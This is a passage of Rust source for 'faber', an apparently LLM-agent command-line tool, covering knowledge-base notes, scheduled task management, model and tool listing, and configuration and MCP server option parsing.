            table.set_titles(Row::new(
                ["ID", "Title", "Tags", "Scope", "By", "Updated"]
                    .iter()
                    .map(|t| Cell::new(t))
                    .collect(),
            ));
            for note in &notes {
                let scope = match &note.agent_name {
                    Some(agent) => format!("private: {}", agent),
                    None => "shared".to_string(),
                };
                table.add_row(Row::new(vec![
                    Cell::new(&note.id.to_string()),
                    Cell::new(&first_line(&note.title, 50)),
                    Cell::new(&note.tags.join(", ")),
                    Cell::new(&scope),
                    Cell::new(note.created_by.as_deref().unwrap_or("-")),
                    Cell::new(&updated(note)),
                ]));
            }
            table.printstd();
        }
        Some(KbAction::Search { query, tag, limit }) => {
            let hits = db.kb_search(query, &viewer, tag.as_deref(), *limit)?;
            if hits.is_empty() {
                println!("No notes match.");
            }
            for hit in &hits {
                println!(
                    "#{} {}{} ({})\n    {}",
                    hit.note.id,
                    hit.note.title,
                    tag_list(&hit.note),
                    updated(&hit.note),
                    hit.snippet.replace('\n', " ")
                );
            }
        }
        Some(KbAction::Show { note }) => {
            let found = match note.parse::<i64>() {
                Ok(id) => db.kb_get(id, &viewer)?,
                Err(_) => db.kb_get_by_title(note, &viewer)?,
            };
            let found = found.ok_or_else(|| format!("no note {}", note))?;
            println!("{}", format_kb_note(&found));
        }
        Some(KbAction::Add {
            title,
            body,
            tags,
            agent,
        }) => {
            let body = match body {
                Some(body) => body.clone(),
                None => {
                    let mut body = String::new();
                    std::io::stdin().read_to_string(&mut body)?;
                    body
                }
            };
            let (id, created) = db.kb_write(title, &body, tags, agent.as_deref(), Some("user"))?;
            println!(
                "{} note #{}: {}",
                if created { "Added" } else { "Updated" },
                id,
                title.trim()
            );
        }
        Some(KbAction::Rm { ids }) => {
            let mut missing = 0;
            for &id in ids {
                if db.kb_delete(id, &viewer)? {
                    println!("Deleted note #{}.", id);
                } else {
                    missing += 1;
                    eprintln!("No note #{}.", id);
                }
            }
            if missing > 0 {
                return Err(format!("{} of {} note(s) not found", missing, ids.len()).into());
            }
        }
    }
    Ok(())
}

/// `faber tasks hold` / `release`: puts tasks on hold or releases them,
/// saying for each one that couldn't be changed why not.
fn hold_tasks_command(
    db: &Option<Arc<dyn DbBackend>>,
    ids: &[i64],
    hold: bool,
) -> Result<(), Box<dyn Error>> {
    let db = db.as_ref().ok_or(
        "No database configured: set 'db_path' in your config file, or use --db-path or --server.",
    )?;
    let mut failed = 0;
    for &id in ids {
        if db.set_task_held(id, hold)? {
            println!(
                "Task #{} {}.",
                id,
                if hold { "is on hold" } else { "is released" }
            );
            continue;
        }
        failed += 1;
        let reason = match db.get_task(id)?.map(|t| t.status) {
            None => "no such task".to_string(),
            Some(status) if hold && status == db::TaskStatus::HELD => {
                "it's already on hold".to_string()
            }
            Some(status) if !hold && status == db::TaskStatus::SCHEDULED => {
                "it isn't on hold".to_string()
            }
            Some(status) if hold && status == db::TaskStatus::RUNNING => {
                "it's already running".to_string()
            }
            Some(status) => format!("it's {}", status),
        };
        eprintln!(
            "Task #{} can't be {}: {}.",
            id,
            if hold { "held" } else { "released" },
            reason
        );
    }
    if failed > 0 {
        return Err(format!("{} of {} task(s) not changed", failed, ids.len()).into());
    }
    Ok(())
}

/// A task as it is, as a `NewTask` - to change and give `update_task`.
fn task_as_new(task: &db::TaskRow) -> db::NewTask {
    db::NewTask {
        name: task.name.clone(),
        description: task.description.clone(),
        kind: task.kind.clone(),
        command: task.command.clone(),
        agent_name: task.agent_name.clone(),
        schedule: match &task.cron_expression {
            Some(expression) if task.task_type == "cron" => db::TaskSchedule::Cron {
                expression: expression.clone(),
                max_runs: task.max_runs,
            },
            _ => db::TaskSchedule::Once {
                at: task
                    .run_at
                    .clone()
                    .unwrap_or_else(|| chrono::Utc::now().to_rfc3339()),
            },
        },
        held: task.status == db::TaskStatus::HELD,
        depends_on: task.depends_on.clone(),
        profile: task.profile.clone(),
        run_safe: task.run_safe,
        cwd: task.cwd.clone(),
    }
}

/// `faber tasks edit`: changes what's given of a task that isn't running.
fn edit_task_command(
    db: &Option<Arc<dyn DbBackend>>,
    action: &TasksAction,
) -> Result<(), Box<dyn Error>> {
    let db = db.as_ref().ok_or(
        "No database configured: set 'db_path' in your config file, or use --db-path or --server.",
    )?;
    let TasksAction::Edit {
        id,
        text,
        after,
        at,
        cron,
        max_runs,
        agent,
        profile,
        any,
        name,
        depends_on,
        no_deps,
        cwd,
        no_cwd,
    } = action
    else {
        return Err("not a `tasks edit` command".into());
    };
    let current = db
        .get_task(*id)?
        .ok_or_else(|| format!("no task #{}", id))?;
    let mut task = task_as_new(&current);
    let now = chrono::Utc::now();
    if let Some(text) = text {
        if text.trim().is_empty() {
            return Err("the task's text is empty".into());
        }
        task.command = text.clone();
    }
    if let Some(name) = name {
        task.name = name.clone();
    }
    if let Some(expression) = cron {
        task.schedule = db::TaskSchedule::Cron {
            expression: expression.clone(),
            max_runs: *max_runs,
        };
    } else if let Some(after) = after {
        let duration = parse_duration(after)
            .ok_or_else(|| format!("can't read --in '{}': use e.g. 30s, 10m, 2h, 1d", after))?;
        task.schedule = db::TaskSchedule::Once {
            at: (now + duration).to_rfc3339(),
        };
    } else if let Some(at) = at {
        task.schedule = db::TaskSchedule::Once {
            at: parse_datetime(at)
                .unwrap_or_else(|| Err(format!("can't read --at '{}'", at)))?
                .to_rfc3339(),
        };
    }
    if *any {
        task.agent_name = None;
        task.profile = None;
    } else if let Some(agent) = agent {
        task.agent_name = Some(agent.clone());
        task.profile = None;
    } else if let Some(profile) = profile {
        task.profile = Some(profile.clone());
        task.agent_name = None;
    }
    if *no_deps {
        task.depends_on.clear();
    } else if !depends_on.is_empty() {
        task.depends_on = depends_on.clone();
    }
    if *no_cwd {
        task.cwd = None;
    } else if let Some(dir) = cwd {
        task.cwd = Some(resolve_cwd(&std::env::current_dir()?, dir)?);
    }
    if !db.update_task(*id, &task)? {
        return Err(format!("task #{} is running: stop it to change it", id).into());
    }
    println!("Task #{} changed.", id);
    Ok(())
}

/// `faber tasks stop`: asks whoever runs tasks to stop them (see
/// `db::request_task_stop`).
fn stop_tasks_command(db: &Option<Arc<dyn DbBackend>>, ids: &[i64]) -> Result<(), Box<dyn Error>> {
    let db = db.as_ref().ok_or(
        "No database configured: set 'db_path' in your config file, or use --db-path or --server.",
    )?;
    let mut failed = 0;
    for &id in ids {
        if db.request_task_stop(id)? {
            println!("Task #{} is being stopped.", id);
            continue;
        }
        failed += 1;
        match db.get_task(id)? {
            None => eprintln!("Task #{} can't be stopped: no such task.", id),
            Some(task) => eprintln!(
                "Task #{} can't be stopped: it's {}, not running.",
                id, task.status
            ),
        }
    }
    if failed > 0 {
        return Err(format!("{} of {} task(s) not changed", failed, ids.len()).into());
    }
    Ok(())
}

/// `faber tasks run`: makes tasks due now (see `db::run_task_now`).
fn run_tasks_command(db: &Option<Arc<dyn DbBackend>>, ids: &[i64]) -> Result<(), Box<dyn Error>> {
    let db = db.as_ref().ok_or(
        "No database configured: set 'db_path' in your config file, or use --db-path or --server.",
    )?;
    let mut failed = 0;
    for &id in ids {
        if db.run_task_now(id)? {
            println!("Task #{} runs as soon as it can.", id);
            continue;
        }
        failed += 1;
        match db.get_task(id)? {
            None => eprintln!("Task #{} can't be run: no such task.", id),
            Some(_) => eprintln!("Task #{} can't be run: it's already running.", id),
        }
    }
    if failed > 0 {
        return Err(format!("{} of {} task(s) not changed", failed, ids.len()).into());
    }
    Ok(())
}

/// `faber tasks assign`: moves tasks to run on `agent`, on a new agent made
/// from `profile`, or (neither) on any agent.
fn assign_tasks_command(
    db: &Option<Arc<dyn DbBackend>>,
    ids: &[i64],
    agent: Option<&str>,
    profile: Option<&str>,
) -> Result<(), Box<dyn Error>> {
    let db = db.as_ref().ok_or(
        "No database configured: set 'db_path' in your config file, or use --db-path or --server.",
    )?;
    let mut failed = 0;
    for &id in ids {
        let result = db.set_task_target(id, agent, profile);
        let task = db.get_task(id)?;
        match (result, task) {
            (Ok(true), Some(task)) => {
                println!("Task #{} now runs on {}.", id, task_target(&task));
                continue;
            }
            (Ok(_), None) => eprintln!("Task #{} can't be moved: no such task.", id),
            (Ok(_), Some(task)) => {
                eprintln!("Task #{} can't be moved: it's {} already.", id, task.status)
            }
            (Err(e), _) => eprintln!("Task #{} can't be moved: {}.", id, e),
        }
        failed += 1;
    }
    if failed > 0 {
        return Err(format!("{} of {} task(s) not changed", failed, ids.len()).into());
    }
    Ok(())
}

/// Warns when `profile` isn't one of this config's: the task can still be
/// made, since a worker elsewhere, with another config, may have it.
fn warn_unknown_profile(opts: &Opts, profile: Option<&str>) {
    if let Some(profile) = profile {
        if !opts.profiles.contains_key(profile) {
            eprintln!(
                "Warning: no profile '{}' in this config; only a worker whose config has it will run the task.",
                profile
            );
        }
    }
}

/// `faber tasks show`: prints everything about one task.
fn show_task_command(
    db: &Option<Arc<dyn DbBackend>>,
    id: i64,
    json: bool,
) -> Result<(), Box<dyn Error>> {
    let db = db.as_ref().ok_or(
        "No database configured: set 'db_path' in your config file, or use --db-path or --server.",
    )?;
    let task = db.get_task(id)?.ok_or_else(|| format!("no task #{}", id))?;
    if json {
        println!("{}", serde_json::to_string_pretty(&task)?);
    } else {
        let dependencies: Vec<String> = task
            .depends_on
            .iter()
            .map(|id| match db.get_task(*id) {
                Ok(Some(dependency)) => format!(
                    "#{} ({}{})",
                    id,
                    dependency.status,
                    match dependency.last_outcome.as_deref() {
                        Some("succeeded") => " ✓",
                        Some(_) => " ✗",
                        None => "",
                    }
                ),
                _ => format!("#{} (gone)", id),
            })
            .collect();
        print!(
            "{}",
            describe_task(&task, &dependencies, chrono::Utc::now())
        );
    }
    Ok(())
}

/// `faber tasks prune`: deletes (or with `dry_run` lists) done tasks whose
/// last run is older than `older_than`.
fn prune_tasks_command(
    db: &Option<Arc<dyn DbBackend>>,
    older_than: Option<&str>,
    all_done: bool,
    dry_run: bool,
) -> Result<(), Box<dyn Error>> {
    let db = db.as_ref().ok_or(
        "No database configured: set 'db_path' in your config file, or use --db-path or --server.",
    )?;
    // --done alone means no age limit; otherwise --older-than, or 7d.
    let older_than = match (older_than, all_done) {
        (Some(age), _) => Some(age),
        (None, true) => None,
        (None, false) => Some("7d"),
    };
    let age = older_than
        .map(|text| {
            parse_duration(text).ok_or_else(|| {
                format!(
                    "can't read --older-than '{}': use a duration like 12h, 7d or 2w",
                    text
                )
            })
        })
        .transpose()?
        .unwrap_or_else(chrono::Duration::zero);
    let which = match older_than {
        Some(text) => format!("done task(s) older than {}", text),
        None => "done task(s)".to_string(),
    };
    let now = chrono::Utc::now();
    // A cutoff a moment in the future, for --done, so a task that
    // finished this very second still counts.
    let cutoff = now - age + chrono::Duration::seconds(1);
    let pruned = db.prune_tasks(&cutoff.to_rfc3339(), dry_run)?;
    if pruned.is_empty() {
        println!("No {}.", which.replace("task(s)", "tasks"));
        return Ok(());
    }
    println!(
        "{} {} {}:",
        if dry_run { "Would delete" } else { "Deleted" },
        pruned.len(),
        which
    );
    for task in &pruned {
        let when = task
            .last_run_at
            .as_deref()
            .and_then(db::parse_db_time)
            .map(|t| format!("last run {}", format_relative(t, now)))
            .unwrap_or_else(|| "never ran".to_string());
        println!("  #{} {} ({})", task.id, task.name, when);
    }
    Ok(())
}

/// `faber tasks add`: creates a task and says when and by whom it'll run.
fn add_task_command(
    db: &Option<Arc<dyn DbBackend>>,
    action: &TasksAction,
) -> Result<(), Box<dyn Error>> {
    let db = db.as_ref().ok_or(
        "No database configured: set 'db_path' in your config file, or use --db-path or --server.",
    )?;
    let now = chrono::Utc::now();
    let task = new_task_from_cli(action, now)?;
    let id = db.create_task(&task)?;
    let when = match &task.schedule {
        db::TaskSchedule::Cron { expression, .. } => format!("on \"{}\"", expression),
        db::TaskSchedule::Once { at } => match db::parse_db_time(at) {
            Some(t) if t <= now + chrono::Duration::seconds(1) => "as soon as possible".to_string(),
            Some(t) => format!(
                "{} ({})",
                format_relative(t, now),
                t.with_timezone(&chrono::Local).format("%Y-%m-%d %H:%M:%S")
            ),
            None => at.clone(),
        },
    };
    let by = match (task.kind.as_str(), &task.agent_name, &task.profile) {
        (db::TaskKind::TOOL, _, _) => "by any session's scheduler".to_string(),
        (_, _, Some(profile)) => format!(
            "on a new agent made from profile '{}', by a `faber worker` that has it",
            profile
        ),
        (_, Some(agent), _) => format!("by agent '{}' once a chat with it is waiting", agent),
        (_, None, _) => "by the first agent waiting in a chat".to_string(),
    };
    if task.held {
        println!(
            "Created task #{} \"{}\" on hold: once released (faber tasks release {}), it runs {}, {}.",
            id, task.name, id, when, by
        );
    } else {
        println!(
            "Created task #{} \"{}\": runs {}, {}.",
            id, task.name, when, by
        );
    }
    Ok(())
}

/// `faber tasks`: prints scheduled tasks as a table - once, or with
/// `watch` every that many seconds until interrupted.
fn tasks_command(
    db: &Option<Arc<dyn DbBackend>>,
    since: Option<&str>,
    last: Option<usize>,
    agent: Option<&str>,
    profile: Option<&str>,
    watch: Option<u64>,
    board: bool,
) -> Result<(), Box<dyn Error>> {
    let db = db.as_ref().ok_or(
        "No database configured: set 'db_path' in your config file, or use --db-path or --server.",
    )?;
    let Some(interval) = watch else {
        return print_tasks_table(
            db.as_ref(),
            since,
            last,
            agent,
            profile,
            board,
            chrono::Utc::now(),
        );
    };
    // Fail on a bad --since right away rather than on every refresh.
    if let Some(since) = since {
        parse_since(since, chrono::Utc::now())?;
    }
    let interval = Duration::from_secs(interval.max(1));
    loop {
        let now = chrono::Utc::now();
        // Home the cursor and clear the screen, then redraw.
        print!("\x1b[H\x1b[2J");
        println!(
            "Every {}s - {} (Ctrl-C to quit)\n",
            interval.as_secs(),
            now.with_timezone(&chrono::Local).format("%H:%M:%S")
        );
        // A failed refresh (e.g. a dropped --server connection) is shown
        // and retried, not fatal.
        if let Err(e) = print_tasks_table(db.as_ref(), since, last, agent, profile, board, now) {
            println!("Error: {}", e);
        }
        std::io::stdout().flush()?;
        std::thread::sleep(interval);
    }
}

fn list_tools_command(
    mcp_manager: &Option<Arc<faber::mcp::McpManager>>,
) -> Result<(), Box<dyn Error>> {
    let safe_tools = initialize_tools(false, None);
    let all_tools = initialize_tools(true, None);

    let mut names: Vec<&String> = all_tools.keys().collect();
    names.sort();

    for name in names {
        let marker = if safe_tools.contains_key(name) {
            ""
        } else {
            " [unsafe]"
        };
        println!("  {}{}", name, marker);
    }

    if let Some(mcp) = mcp_manager {
        let schemas = mcp.get_tool_schemas();
        if !schemas.is_empty() {
            println!("MCP tools:");
            let mut mcp_names: Vec<String> = schemas
                .iter()
                .filter_map(|s| {
                    s.get("function")
                        .and_then(|f| f.get("name"))
                        .and_then(|n| n.as_str())
                        .map(|n| n.to_string())
                })
                .collect();
            mcp_names.sort();
            for name in &mcp_names {
                println!("  {}", name);
            }
        }
    }

    Ok(())
}

/// Derives a `/models` endpoint URL from a chat-completions endpoint,
/// however it's spelled - shared by `list_models_command` and the
/// best-effort automatic context-window lookup for proactive
/// summarization (see `spawn_context_window_lookup`).
fn models_endpoint_from(base_endpoint: &str) -> String {
    if base_endpoint.ends_with("/chat/completions") {
        base_endpoint.replace("/chat/completions", "/models")
    } else if base_endpoint.ends_with('/') {
        format!("{}models", base_endpoint)
    } else {
        format!("{}/models", base_endpoint)
    }
}

fn list_models_command(opts: &Opts) -> Result<(), Box<dyn Error>> {
    let base_endpoint = opts
        .endpoint
        .clone()
        .unwrap_or_else(|| DEFAULT_ENDPOINT.to_string());

    let models_endpoint = models_endpoint_from(&base_endpoint);

    match list_models_from_endpoint(&models_endpoint, opts.api_key.as_ref()) {
        Ok(models) => {
            if models.is_empty() {
                println!("No models found.");
            } else {
                let source = if opts.endpoint.is_some() {
                    "custom endpoint"
                } else {
                    "default endpoint"
                };
                println!("Available models from {}:", source);
                let mut table = Table::new();
                table.set_format(*format::consts::FORMAT_NO_BORDER_LINE_SEPARATOR);
                table.set_titles(Row::new(vec![
                    Cell::new("ID"),
                    Cell::new("Name"),
                    Cell::new("Context Length"),
                    Cell::new("Prompt_USD/1M"),
                    Cell::new("Compl_USD/1M"),
                    Cell::new("Supported Parameters"),
                ]));

                for model in models {
                    let prompt_price_str = model
                        .pricing
                        .as_ref()
                        .map(|p| p.prompt.as_str())
                        .unwrap_or("N/A");
                    let completion_price_str = model
                        .pricing
                        .as_ref()
                        .map(|p| p.completion.as_str())
                        .unwrap_or("N/A");

                    let prompt_price = match prompt_price_str.parse::<f64>() {
                        Ok(p) => format!("{:.6}", p),
                        Err(_) => prompt_price_str.to_string(),
                    };
                    let completion_price = match completion_price_str.parse::<f64>() {
                        Ok(c) => format!("{:.6}", c),
                        Err(_) => completion_price_str.to_string(),
                    };
                    let context_window = model.context_window().unwrap_or(0);
                    let supported_parameters = model
                        .supported_parameters
                        .unwrap_or_else(|| vec![])
                        .join(",");

                    table.add_row(Row::new(vec![
                        Cell::new(&model.id),
                        Cell::new(&model.name.unwrap_or("".to_string())),
                        Cell::new(&context_window.to_string()),
                        Cell::new(&prompt_price),
                        Cell::new(&completion_price),
                        Cell::new(&supported_parameters),
                    ]));
                }
                table.printstd();
            }
            Ok(())
        }
        Err(e) => Err(e),
    }
}

/// How `--display-graphics` renders LaTeX in a response.
#[derive(Debug, Clone, Copy, PartialEq, Eq, clap::ValueEnum, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
enum DisplayGraphicsMode {
    /// Each `\[...\]`/`\(...\)`/`$$...$$` block is rendered and shown in
    /// place of its own raw text, as soon as it finishes streaming in - see
    /// `latex_aware_line_streamer` and `latex_kitty::render_latex_to_png`.
    Partial,
    /// The live text streams normally, untouched (no per-block
    /// substitution while it's still in progress - there's no way to
    /// re-typeset a whole document incrementally as it arrives). Once the
    /// response is done, the whole thing - the surrounding Markdown text
    /// too, not just the isolated math - is *additionally* rendered as one
    /// properly typeset document, via
    /// `latex_kitty::render_full_response_to_png`: real paragraph flow,
    /// headings, lists, and inline math that reads as part of its
    /// sentence, not a disconnected image dropped into plain text.
    Full,
}

#[derive(Parser, Debug, Clone, Serialize, Deserialize)]
#[clap(version = env!("CARGO_PKG_VERSION"))]
#[serde(default)]
struct Opts {
    #[clap(short = 'c', long = "config")]
    #[serde(skip)]
    /// Path to JSON configuration file
    ///
    /// If not specified, will automatically use 'config.json'
    /// from current directory if it exists.
    ///
    /// Example config file:
    /// {
    ///   "model": "granite",
    ///   "api_key": "~/.path/to/key",
    ///   "parameter": ["temperature=0.7"]
    /// }
    ///
    /// CLI arguments override config file values.
    config: Option<String>,
    #[clap(short, long)]
    /// Override the maximum number of tokens to generate
    max_tokens: Option<u32>,
    #[clap(long)]
    /// Specify the AI model to use
    model: Option<String>,
    #[clap(long)]
    /// Override the endpoint URL to use
    endpoint: Option<String>,
    #[clap(long)]
    /// Inhibit usage of any tool
    no_tools: bool,
    /// Enable unsafe tools
    #[clap(long)]
    unsafe_tools: bool,
    #[clap(long, value_delimiter = ',')]
    /// Only enable the specified tools (comma-separated). Overrides --unsafe-tools
    tools: Vec<String>,
    #[clap(long)]
    /// Control when tools are used: "auto" (default), "none", "required"
    tool_choice: Option<String>,
    #[clap(long)]
    /// Override the file path to read API key from
    api_key: Option<String>,
    #[clap(long)]
    /// Set model parameters in NAME=VALUE format (e.g., --parameter temperature=0.7 --parameter top_p=0.9)
    parameter: Vec<String>,
    #[clap(long)]
    /// Path to the SQLite database file for persistent storage (agents, tasks, memory)
    db_path: Option<String>,
    #[clap(long)]
    /// Start chat session with this agent instead of 'default'
    agent: Option<String>,
    #[clap(long)]
    /// The model's context window size, in tokens - used to proactively
    /// summarize the conversation before it gets too large, rather than
    /// only reactively after an actual "context length exceeded" failure.
    /// If not given, faber tries to look this up automatically from the
    /// endpoint's `/models` listing at chat startup (best-effort, in the
    /// background - if that fails or the model isn't listed, proactive
    /// summarization simply never triggers, same as leaving this unset).
    context_window: Option<u32>,
    #[clap(long, value_enum)]
    /// Render \[...\], \(...\), and $$...$$ LaTeX blocks in responses as
    /// images, on terminals where inline graphics display is supported (a
    /// no-op elsewhere). Requires a local LaTeX toolchain (pdflatex +
    /// pdftocairo). Off by default since it shells out to that toolchain for
    /// every response - pass "partial" for the common case (each math
    /// block rendered in place of its own raw text as it streams in), or
    /// "full" to additionally render the whole response - the surrounding
    /// text too, not just the math - as one properly typeset document once
    /// it's done.
    ///
    /// Always takes an explicit value (--display-graphics=partial or
    /// =full, or "partial"/"full" as a separate following argument) -
    /// never a bare --display-graphics: since this flag has to come before
    /// the subcommand (e.g. `chat`), a bare, value-less form would make
    /// clap try to consume the subcommand's own name as this flag's value
    /// instead, and fail.
    display_graphics: Option<DisplayGraphicsMode>,
    #[clap(long)]
    /// Connect to a remote faber server instead of using a local database
    server: Option<String>,
    #[clap(long)]
    /// Read the server's key from this file (first line). Without it, a
    /// server on this machine's key is found where it wrote it
    server_key_file: Option<String>,

    #[clap(skip)]
    #[serde(default)]
    mcp_servers: HashMap<String, faber::mcp::McpServerConfig>,

    /// Language servers for the lsp tool, added to or replacing the
    /// built-in ones (`null` removes one) - see `lsp::ServerConfig`.
    #[clap(skip)]
    #[serde(default)]
    lsp_servers: HashMap<String, Option<lsp::ServerConfig>>,

    /// Named agent settings to make agents from - see `Profile`.
    #[clap(skip)]
    #[serde(default)]
    profiles: Profiles,

    #[clap(long)]
    #[serde(skip)]
    /// Make the chat's agent (--agent, or 'default') from this profile in
    /// the config file, replacing its settings with the profile's
    profile: Option<String>,

    #[clap(long, value_name = "N")]
    /// At most this many requests to the model in flight at once, across the
    /// chat, sub-agents, fan-out workers and scheduled tasks - e.g. the
    /// number of slots a llama.cpp server runs with (--parallel). Unlimited
    /// unless set.
    max_parallel_requests: Option<usize>,

    #[clap(long, value_name = "DURATION")]
    /// While `faber chat` runs, delete done tasks whose last run is older
    /// than this (e.g. 30d), checked hourly. Off unless set.
    task_retention: Option<String>,

    #[clap(long = "mcp-server")]
    #[serde(skip)]
    /// Give the session's own agent an MCP server's tools: NAME=URL (or
    /// NAME=sse:URL) adds a remote one, over a config file entry with the
    /// same name; NAME alone, one the config file's "mcp_servers" defines.
    /// Can be repeated. Other agents only get the servers their own
    /// settings or profile list
    mcp_server: Vec<String>,

    #[clap(skip)]
    #[serde(skip)]
    /// The servers --mcp-server named, for the session's own agent.
    mcp_granted: Vec<String>,

    #[clap(subcommand)]
    #[serde(skip)]
    command: CliCommand,

    #[clap()]
    #[serde(skip)]
    args: Vec<String>,
}

impl Default for Opts {
    fn default() -> Self {
        Self {
            config: None,
            max_tokens: None,
            model: None,
            endpoint: None,
            no_tools: false,
            unsafe_tools: false,
            tools: Vec::new(),
            tool_choice: None,
            api_key: None,
            parameter: Vec::new(),
            db_path: None,
            agent: None,
            context_window: None,
            display_graphics: None,
            server: None,
            server_key_file: None,
            mcp_servers: HashMap::new(),
            lsp_servers: HashMap::new(),
            profiles: HashMap::new(),
            profile: None,
            task_retention: None,
            max_parallel_requests: None,
            mcp_server: Vec::new(),
            mcp_granted: Vec::new(),
            command: CliCommand::Chat {},
            args: Vec::new(),
        }
    }
}

impl Opts {
    /// Load configuration from a JSON file
    fn load_from_file(path: &str) -> Result<Self, Box<dyn Error>> {
        debug!("Loading configuration from file: {}", path);

        let content = std::fs::read_to_string(path)
            .map_err(|e| format!("Failed to read config file '{}': {}", path, e))?;

        let config: Opts = serde_json::from_str(&content)
            .map_err(|e| format!("Failed to parse config file '{}': {}", path, e))?;

        debug!("Successfully loaded configuration from {}", path);
        Ok(config)
    }

    /// Merge this config with CLI options, giving precedence to CLI options
    fn merge_with_config(&mut self, config: Opts) {
        debug!("Merging configuration file with CLI options");

        // Only use config values if CLI didn't provide them
        if self.max_tokens.is_none() {
            self.max_tokens = config.max_tokens;
        }

        if self.model.is_none() {
            self.model = config.model;
        }

        if self.endpoint.is_none() {
            self.endpoint = config.endpoint;
        }

        if !self.no_tools && config.no_tools {
            self.no_tools = true;
        }

        if !self.unsafe_tools && config.unsafe_tools {
            self.unsafe_tools = true;
        }

        if self.display_graphics.is_none() {
            self.display_graphics = config.display_graphics;
        }

        if self.context_window.is_none() {
            self.context_window = config.context_window;
        }

        if self.tool_choice.is_none() {
            self.tool_choice = config.tool_choice;
        }

        if self.api_key.is_none() {
            self.api_key = config.api_key;
        }

        // Merge parameters - config parameters are added first, then CLI parameters
        if !config.parameter.is_empty() {
            let mut merged_params = config.parameter;
            merged_params.extend(self.parameter.clone());
            self.parameter = merged_params;
        }

        if self.db_path.is_none() {
            self.db_path = config.db_path;
        }

        if self.server.is_none() {
            self.server = config.server;
        }

        if self.server_key_file.is_none() {
            self.server_key_file = config.server_key_file;
        }

        if self.mcp_servers.is_empty() {
            self.mcp_servers = config.mcp_servers;
        }

        if self.profiles.is_empty() {
            self.profiles = config.profiles;
        }

        if self.lsp_servers.is_empty() {
            self.lsp_servers = config.lsp_servers;
        }

        if self.task_retention.is_none() {
            self.task_retention = config.task_retention;
        }

        if self.max_parallel_requests.is_none() {
            self.max_parallel_requests = config.max_parallel_requests;
        }

        debug!("Configuration merge completed");
    }

    /// Parses `--mcp-server` flags (NAME=URL or NAME=sse:URL) and inserts
    /// them into `mcp_servers`, overwriting any config file entry with the
    /// same name - consistent with CLI arguments overriding config file
    /// values elsewhere in `Opts`.
    fn apply_mcp_server_flags(&mut self) -> Result<(), Box<dyn Error>> {
        for spec in &self.mcp_server {
            let name = if spec.contains('=') {
                let (name, config) = parse_mcp_server_flag(spec)?;
                self.mcp_servers.insert(name.clone(), config);
                name
            } else if self.mcp_servers.contains_key(spec) {
                spec.clone()
            } else {
                return Err(format!(
                    "--mcp-server {}: no MCP server '{}' in the config file's \"mcp_servers\" \
                     (give NAME=URL to add a remote one)",
                    spec, spec
                )
                .into());
            };
            self.mcp_granted.push(name);
        }
        Ok(())
    }
}

/// Parses one `--mcp-server` value into a server name and config. Accepts
/// `NAME=URL` for an HTTP-transport remote server, or `NAME=sse:URL` for an
/// SSE-transport one - the two remote transports `McpServerConfig` supports,
/// mirroring the config file's `url`/`sse` fields.
fn parse_mcp_server_flag(
    spec: &str,
) -> Result<(String, faber::mcp::McpServerConfig), Box<dyn Error>> {
    let (name, value) = spec.split_once('=').ok_or_else(|| {
        format!(
            "invalid --mcp-server '{}': expected NAME=URL or NAME=sse:URL",
            spec
        )
    })?;
    if name.is_empty() {
        return Err(format!("invalid --mcp-server '{}': server name is empty", spec).into());
    }
    if value.is_empty() {
        return Err(format!("invalid --mcp-server '{}': URL is empty", spec).into());
    }

    let config = if let Some(sse_url) = value.strip_prefix("sse:") {
        faber::mcp::McpServerConfig {
            command: None,
            args: None,
            env: None,
            url: None,
            sse: Some(sse_url.to_string()),
            headers: None,
        }
    } else {
        faber::mcp::McpServerConfig {
            command: None,
            args: None,
            env: None,
            url: Some(value.to_string()),
            sse: None,
            headers: None,
        }
    };
    Ok((name.to_string(), config))
}

#[derive(Debug, Clone, Subcommand)]
enum TasksAction {
    /// Show everything about one task: its full command, schedule, state
    /// and the full result of its last run
    Show {
        /// The task's id, as `faber tasks` lists it
        id: i64,
        /// Print the task as JSON instead
        #[clap(long)]
        json: bool,
    },
    /// Delete done tasks whose last run is older than --older-than (7d by
    /// default), or all of them with --done. Scheduled, running and
    /// disabled tasks are never deleted
    Prune {
        /// How old a done task's last run must be: 30m, 12h, 7d, 2w
        #[clap(long, value_name = "DURATION")]
        older_than: Option<String>,
        /// Delete every done task, however recent (unless --older-than
        /// is also given)
        #[clap(long)]
        done: bool,
        /// Only list what would be deleted
        #[clap(long)]
        dry_run: bool,
    },
    /// Create a task: by default a prompt for an agent, run by the first
    /// `faber chat` waiting at its prompt (only one whose agent is --agent,
    /// if given) once it's due
    Add {
        /// What the agent should do - or, with --tool, the tool call to
        /// run, as JSON: {"tool": "...", "arguments": {...}}
        text: String,
        /// Run it this long from now: 30s, 10m, 2h, 1d, 1w
        #[clap(long = "in", value_name = "DURATION", conflicts_with_all = ["at", "cron"])]
        after: Option<String>,
        /// Run it at this time: "2026-10-03 08:00" (local), 2026-10-03, or RFC 3339
        #[clap(long, conflicts_with = "cron")]
        at: Option<String>,
        /// Run it repeatedly, on a 7-field cron schedule
        /// ("sec min hour day month weekday year", e.g. "0 0 9 * * * *")
        #[clap(long)]
        cron: Option<String>,
        /// With --cron, stop after this many runs
        #[clap(long, requires = "cron")]
        max_runs: Option<i64>,
        /// Only this agent may pick it up (for --tool: the agent whose
        /// conversation gets the result)
        #[clap(long)]
        agent: Option<String>,
        /// Run it on a new agent made from this profile (see "profiles" in
        /// the config file), by a `faber worker` that has it
        #[clap(long, conflicts_with_all = ["agent", "tool"])]
        profile: Option<String>,
        /// The text is a tool call to run directly, not a prompt for an agent
        #[clap(long)]
        tool: bool,
        /// A name to show in `faber tasks` (default: the start of the text)
        #[clap(long)]
        name: Option<String>,
        /// Create it on hold: nobody picks it up until `faber tasks release`
        #[clap(long)]
        hold: bool,
        /// Only once this task is done, successfully - it fails if that
        /// one fails (can be repeated)
        #[clap(long = "after", value_name = "ID")]
        depends_on: Vec<i64>,
        /// Run it in this directory, whichever agent runs it (default: the
        /// directory that agent works in)
        #[clap(long, value_name = "DIR")]
        cwd: Option<String>,
    },
    /// Change a task that isn't running: what it says, where and when it
    /// runs, what it waits for, its directory - only what's given
    Edit {
        /// The task's id, as `faber tasks` lists it
        id: i64,
        /// What it should do now (for a tool task, the tool call's JSON)
        text: Option<String>,
        /// Run it this long from now: 30s, 10m, 2h, 1d, 1w
        #[clap(long = "in", value_name = "DURATION", conflicts_with_all = ["at", "cron"])]
        after: Option<String>,
        /// Run it at this time: "2026-10-03 08:00" (local), 2026-10-03, or RFC 3339
        #[clap(long, conflicts_with = "cron")]
        at: Option<String>,
        /// Run it on this 7-field cron schedule instead
        #[clap(long)]
        cron: Option<String>,
        /// With --cron, stop after this many runs
